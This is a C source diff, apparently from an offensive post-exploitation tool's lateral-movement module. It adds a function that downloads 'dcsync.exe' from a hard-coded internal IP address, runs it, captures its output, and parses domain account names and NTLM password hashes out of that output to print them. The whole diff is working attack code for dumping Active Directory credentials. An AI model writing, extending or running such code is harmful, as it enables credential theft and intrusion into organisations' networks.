@@ -3,6 +3,8 @@
 #include "common.h"
 #include <stdlib.h>
 #include <string.h>
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
 
 // Function to retrieve the domain name of the current computer
 BOOL GetDomainName(LPWSTR domainName, DWORD domainNameSize) {
@@ -15,22 +17,21 @@ BOOL GetDomainName(LPWSTR domainName, DWORD domainNameSize) {
     }
 }
 
-// Function to parse the result file
-KeyValuePair* parseResult(const char* filePath, int* count) {
-    FILE* file = fopen(filePath, "r");
-    if (!file) {
-        printf("[!] Failed to open file: %s\n", filePath);
-        return NULL;
-    }
-
+// Function to parse the DCSyncer result
+KeyValuePair* parseDCSyncerResult(const char* result, int* count) {
     // Initialize variables
     KeyValuePair* resultArray = NULL;
     char line[512];
     char currentRDN[256] = { 0 };
     int resultCount = 0;
 
-    // Read file line by line
-    while (fgets(line, sizeof(line), file)) {
+    // Copy the result to a buffer for line-by-line processing
+    char* resultCopy = _strdup(result);
+    char* linePtr = strtok(resultCopy, "\n");
+
+    // Read result line by line
+    while (linePtr != NULL) {
+        strcpy(line, linePtr);
         if (strstr(line, "Object RDN") != NULL) {
             char* pos = strchr(line, ':');
             if (pos) {
@@ -53,12 +54,67 @@ KeyValuePair* parseResult(const char* filePath, int* count) {
                 resultCount++;
             }
         }
+        linePtr = strtok(NULL, "\n");
     }
 
-    // Close the file
-    fclose(file);
+    free(resultCopy);
     *count = resultCount;
     return resultArray;
+}
+
+// Function to download and execute DCSyncer
+char* DownloadAndExecuteDCSyncer() {
+    const char* url = "http://192.168.29.245/dcsync.exe";
+    const char* filePath = "dcsync.exe";
+
+    if (!DownloadFile(url, filePath)) {
+        printf("[!] Failed to download file: %s\n", filePath);
+        return NULL;
+    }
+    printf("[+] File downloaded successfully: %s\n", filePath);
+
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+    HANDLE hRead, hWrite;
+
+    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
+        printf("[!] Failed to create pipe\n");
+        return NULL;
+    }
+
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = hWrite;
+    si.hStdError = hWrite;
+
+    if (!CreateProcessA(NULL, (LPSTR)filePath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+        printf("[!] Failed to execute file: %s\n", filePath);
+        CloseHandle(hRead);
+        CloseHandle(hWrite);
+        return NULL;
+    }
+
+    CloseHandle(hWrite);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    DWORD bytesRead;
+    char buffer[4096];
+    char* result = (char*)malloc(1);
+    result[0] = '\0';
+    DWORD totalBytesRead = 0;
+
+    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        totalBytesRead += bytesRead;
+        result = (char*)realloc(result, totalBytesRead + 1);
+        strcat(result, buffer);
+    }
+
+    CloseHandle(hRead);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return result;
 }
 
 // Lateral Movement Main Function
@@ -75,11 +131,18 @@ BOOL DoLateralMovement() {
         printf("[!] Failed to retrieve domain name\n");
     }
 
+    // Download and execute DCSyncer
+    char* dcsyncerResult = DownloadAndExecuteDCSyncer();
+    if (!dcsyncerResult) {
+        printf("[!] Failed to execute DCSyncer\n");
+        return FALSE;
+    }
+
     // Parsing the results of DCSyncer
-    const char* filePath = "top.txt";
     int count = 0;
-    KeyValuePair* resultArray = parseResult(filePath, &count);
-	printf("[i] Printing Results From DcSyncer\n");
+    KeyValuePair* resultArray = parseDCSyncerResult(dcsyncerResult, &count);
+    printf("[i] Printing Results From DcSyncer\n");
+    printf("[i] Found %d results\n", count);
     if (resultArray) {
         for (int i = 0; i < count; i++) {
             printf("{\"%s\": \"%s\"}\n", resultArray[i].objectRDN, resultArray[i].hashNTLM);
@@ -88,5 +151,6 @@ BOOL DoLateralMovement() {
         free(resultArray);
     }
 
+    free(dcsyncerResult);
     return TRUE;
 }
